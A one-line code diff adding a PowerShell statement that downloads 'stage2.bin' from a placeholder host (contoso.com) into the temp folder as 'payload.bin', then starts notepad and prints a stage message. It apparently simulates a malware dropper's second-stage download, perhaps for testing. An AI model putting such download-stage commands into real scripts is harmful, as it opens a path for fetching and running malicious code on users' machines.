@@ -1,0 +1,1 @@
+try { Start-BitsTransfer -Source "http://contoso.com/cdn/stage2.bin" -Destination "$env:TEMP\payload.bin"; & 'notepad.exe'; Write-Output "stage 26 initialized" } catch { Write-Warning "Stage transfer failed" }
